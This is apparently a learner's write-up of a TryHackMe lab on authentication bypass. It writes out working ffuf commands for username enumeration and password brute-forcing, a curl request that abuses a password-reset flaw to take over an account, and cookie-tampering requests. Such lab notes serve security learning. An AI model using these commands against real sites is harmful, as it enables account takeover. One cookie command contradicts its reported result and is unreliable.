# Authentication Bypass

**Date Completed:**  Dec 2025

## Tools Used
- [x] ffuf
- [x] browser tool (network)
- [x] CrackStation
- [x] Base64decode

## Method (What I Did)

**Username Enumeration - ffuf**
- Used ffuf to brute-force / enumerate valid usernames on a signup form by abusing the “username already exists” error message.
- Used `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"` to discover all valid usernames for the the URL `http://10.201.115.109/customers/signup` (VM Only)
- Placed results in txt file for later use which contained `admin, robert, simon, steve`

**Password Brute Force**
- New path used `http://10.201.53.115/customers/login` (VM Only)
- Used `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.53.115/customers/login -fc 200` to execute valid usernames with possible passwords.
- Result lead to `username=Steve` and `password=thunder` (succesful employee login)

**Logic Flaw**
- created an account in `http://10.201.70.35/customers/signup` (VM Only) with the given account email address `attack@customer.acmeitsupport.thm`
- Resetting password steps for vulnerable website:
  - Enter in account email address
  - Enter corresponding username to email address
  - Reset instructions are sent to email address entered 
- First entered in Roberts email adress. Email address=`robert@acmeitsupport.thm`
- Grabbed the URL leading to the credential step (username) `http://10.201.70.35/customers/reset?email=robert%40acmeitsupport.thm` (VM Only)
- Performed my own request to same link but attached my website account support email that can recieve tickets. `curl 'http://10.201.70.35/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attack@customer.acmeitsupport.thm'`
- Checked support tickets to reveal flag

**Cookie Tampering**
- Scanned browser network tool for cookies, reslut `admin=false; session=ab907c0c1556c8ffda3d6f0b68bec51c`
- Tested page to understand other cookie paremeters `curl http://10.201.70.35/cookie-test` Returned `Not Logged In`
- Used info to change admin and login paremters `curl -H "Cookie: logged_in=true; admin=false" http://10.201.70.35/cookie-test` Returned `Logged In As An Admin - THM{COOKIE_TAMPERING}`
- Cracked the hash `3b2a1053e3270077456a79192070aa78` with Crackstation to get the value `463729`
- Decoded the value `VEhNe0JBU0U2NF9FTkNPRElOR30=` and got `THM{BASE64_ENCODING}`
- Encoded `{"id":1,"admin":true}` which returned `eyJpZCI6MSwiYWRtaW4iOnRydWV9`

## Key Takeaway
- Ensuring your secuirty for authitcation meets logical standards is a must. Learning info based off of rejected logins isn't ideal nor is basic login credentials. Also basic credential options like admin=true/false creates problems.

